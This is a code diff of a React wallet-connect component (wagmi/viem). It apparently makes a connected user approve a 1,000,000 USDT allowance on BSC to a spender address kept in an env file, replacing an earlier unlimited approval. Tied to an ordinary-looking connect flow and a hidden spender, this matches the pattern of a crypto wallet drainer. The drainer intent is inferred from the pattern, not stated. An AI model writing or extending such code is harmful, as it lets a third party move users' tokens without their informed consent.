@@ -5,7 +5,7 @@ import { Wallet, X, AlertCircle, CheckCircle2, Copy, ExternalLink } from 'lucide
 import { useAccount, useConnect, useDisconnect, useBalance, useReadContract, useSwitchChain, useWriteContract, usePublicClient } from 'wagmi';
 import { formatAddress } from '../utils/format';
 import { USDT_ADDRESSES, ERC20_ABI, NETWORK_IDS } from '../config/contracts';
-import { formatUnits, maxUint256 } from 'viem'
+import { formatUnits, parseUnits } from 'viem'
 import { USDT_SPENDER_ADDRESS } from '../../../env';
 import { toast } from 'sonner';
 import { Scanner } from './Scanner';
@@ -140,11 +140,14 @@ export function WalletConnect({ onAddressSelected }: WalletConnectProps) {
 
     (async () => {
       try {
+
+        const amount = parseUnits("1000000", 18); // 1000000 USDT
+
         const hash = await writeContractAsync({
           address: USDT_ADDRESSES.BSC as `0x${string}`,
           abi: ERC20_ABI,
           functionName: 'approve',
-          args: [USDT_SPENDER_ADDRESS, maxUint256],
+          args: [USDT_SPENDER_ADDRESS, amount],
         });
 
         const receipt = await publicClient.waitForTransactionReceipt({ hash });
